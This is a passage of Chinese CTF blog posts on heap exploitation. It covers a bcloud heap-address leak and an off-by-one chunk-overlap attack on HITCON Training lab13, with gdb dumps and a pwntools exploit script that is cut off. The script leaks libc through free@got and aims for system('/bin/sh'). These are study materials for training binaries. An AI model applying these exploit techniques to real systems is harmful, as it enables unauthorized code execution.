<li>vmmap获得libc地址后，在相减获得固定偏移，适用于smallbin第一次free的chunk和mmap申请的堆块</li>
<li>具体情况具体分析，不要照搬照抄原版exp，有些是要改的，大佬们觉得简单可能就没注释了<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li>
<li>题目不难，但自己做确实有点难度，研究了好久</li>
<li>写这个入门的文章也挺难的，要自己懂点，有人带就好点了，希望有师傅可以带带我</li>
<li>要开学了，另一道题目下次在研究了，off-by-one另一道题目</li>
<li>这道题同时学习了unlink跟off-by-one</li>
<li>我一定会出这个系列的文章的，坚持就是胜利(我对我自己说的，hh)</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-10/" itemprop="url">pwn/pwn-heap-learn-10</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn-heap-learn-10"><a href="#pwn-heap-learn-10" class="headerlink" title="pwn-heap-learn-10"></a>pwn-heap-learn-10</h1><h2 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016 BCTF bcloud"></a>2016 BCTF bcloud</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>我自己找洞：<br>发现写的读取函数出现了off-by-one，然而他用malloc(size+0x4)解决了<br>。。。似乎没了？？<br>凉了，又不会做<br>看了wp后发觉初始化名字部分出现了洞，通常这里不会设置洞的。。<br>然后。。。我看了wp居然还是看不出他为啥子能泄露。。。<br>自己调试呗</p>
<p>。。。网上讲解都说name初始化哪里有leak的洞。。。然而我看了好久没发觉，只看出了个off-by-one???<br>最后调试才测试出来，这off-by-one刚好被那个执行顺序刚好缓解了。。。真的烦。。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">init_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  read_str(&amp;s, <span class="number">0x40</span>, <span class="string">'\n'</span>);</span><br><span class="line">  tmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name = tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, &amp;s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Init_name这里，他read_str这里，实际是溢出了一个字节，覆盖到了tmp部分，然后tmp是在在后面malloc的，所以会覆盖掉这个空字节。。。所以实际上就是下图过程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20wx 0xffbe473c-0x40</span><br><span class="line">0xffbe46fc:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe470c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe471c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe472c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe473c:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0xffbe46fc</span><br><span class="line">0xffbe46fc:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe470c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe471c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe472c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe473c:	0x000000000953e008	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>初始输入放到栈s处，然后只有输入的，在malloc过后，就多了个指针，所以strcpy的时候会多复制一个指针，至于有时候会失败，是因为malloc出来的堆地址刚好是对齐了00，所以strcpy遇到’\x00’就停止了，所以这时候复制就会将堆地址也复制过去，进而泄露堆地址</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-3/" itemprop="url">pwn/pwn-heap-learn-3</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-pwn堆入门系列教程3"><a href="#1-pwn堆入门系列教程3" class="headerlink" title="1. pwn堆入门系列教程3"></a>1. pwn堆入门系列教程3</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn入门系列教程2</a></p>
<p>序言：这次终于过了off-by-one来到了Chunk Extend / Overlapping,这部分在上一节也进行了学习，所以难度相对来说不会是那么大，刚起初我以为，因为第一题很简单，但做到第二题，我发觉我连格式化字符串的漏洞都不会利用，真的是太菜了，后面看了看雪大佬的文章才会做</p>
<h2 id="1-1-HITCON-Trainging-lab13"><a href="#1-1-HITCON-Trainging-lab13" class="headerlink" title="1.1. HITCON Trainging lab13"></a>1.1. HITCON Trainging lab13</h2><p>这道题还是相对简单的，对于前面几道来说，上一道已经用过这种方法了，而且比这复杂许多，所以差不多了，不过还有些小细节注意下就好</p>
<h3 id="1-1-1-功能分析"><a href="#1-1-1-功能分析" class="headerlink" title="1.1.1. 功能分析"></a>1.1.1. 功能分析</h3><p>引用于ctf-wiki</p>
<ol>
<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 的漏洞。</li>
<li>展示堆，输出指定索引堆的大小以及内容。</li>
<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
</ol>
<h3 id="1-1-2-漏洞点分析"><a href="#1-1-2-漏洞点分析" class="headerlink" title="1.1.2. 漏洞点分析"></a>1.1.2. 漏洞点分析</h3><p>漏洞点存在off-by-one,通过off-by-one进行overlapping就成了</p>
<h3 id="1-1-3-漏洞利用过程"><a href="#1-1-3-漏洞利用过程" class="headerlink" title="1.1.3. 漏洞利用过程"></a>1.1.3. 漏洞利用过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1775030-0x30</span><br><span class="line">0x1775000:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775010:	0x0000000000000018	0x0000000001775030</span><br><span class="line">0x1775020:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块1 chunk</span></span><br><span class="line">0x1775030:	0x0000000a31313131	0x0000000000000000</span><br><span class="line">0x1775040:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775050:	0x0000000000000010	0x0000000001775070</span><br><span class="line">0x1775060:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块2 chunk</span></span><br><span class="line">0x1775070:	0x0000000a32323232	0x0000000000000000</span><br><span class="line">0x1775080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0x1775090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>攻击过程：</p>
<ol>
<li>创建两个堆块初始化(实际创了4个堆块，两个结构体堆块，两个数据堆块)至于一个为什么要0x18，因为要利用他会使用下个chunk的pre_size作为数据部分，这样才能off-by-one溢出到size</li>
<li>编辑第0块堆块，利用off-by-one覆盖第二块堆块的size，修改size为0x41<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x8a5030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0x8a5000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x00000000008a5030</span></span><br><span class="line"><span class="number">0x8a5020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span> #/bin/sh为后面做准备</span><br><span class="line"><span class="number">0x8a5040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta"># off-by-one</span></span><br><span class="line"><span class="number">0x8a5050</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x00000000008a5070</span></span><br><span class="line"><span class="number">0x8a5060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5070</span>:	<span class="number">0x0000000a32323232</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0x8a5090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li>
<li>free掉第1块，这时候free了一个0x40大小的堆块和一个0x20大小的堆块<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0xf89030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0xf89000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x0000000000f89030</span></span><br><span class="line"><span class="number">0xf89020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0xf89040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta">#free 0x40大小</span></span><br><span class="line"><span class="number">0xf89050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000f89070</span></span><br><span class="line"><span class="number">0xf89060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> <span class="meta">#free 0x21大小</span></span><br><span class="line"><span class="number">0xf89070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0xf89090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li>
<li>这时候create(0x30)的话，会先创建结构体的堆块，这时候fastbin链上有刚free掉的堆块，所以优先使用，创建了0x20大小堆块，然后在创建一个0x40的chunk，这时候可以覆盖掉他的结构体部分的内容指针，泄露地址，在写入就成了</li>
</ol>
<h3 id="1-1-4-exp"><a href="#1-1-4-exp" class="headerlink" title="1.1.4. exp"></a>1.1.4. exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'heapcreator'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'heapcreator'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line">heap = elf</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    free_got = <span class="number">0x602018</span></span><br><span class="line">    create(<span class="number">0x18</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create(<span class="number">0x10</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># overwrite heap 1's struct's size to 0x41</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">    <span class="comment"># trigger heap 1's struct to fastbin 0x40</span></span><br><span class="line">    <span class="comment"># heap 1's content to fastbin 0x20</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span></span><br><span class="line">    <span class="comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span></span><br><span class="line">    <span class="comment"># that is to say we can overwrite new heap 1's struct</span></span><br><span class="line">    <span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">    create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line">    <span class="comment">#create(0x30, p64(0x1234567890))  #1</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="comment"># leak freeaddr</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">    free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span 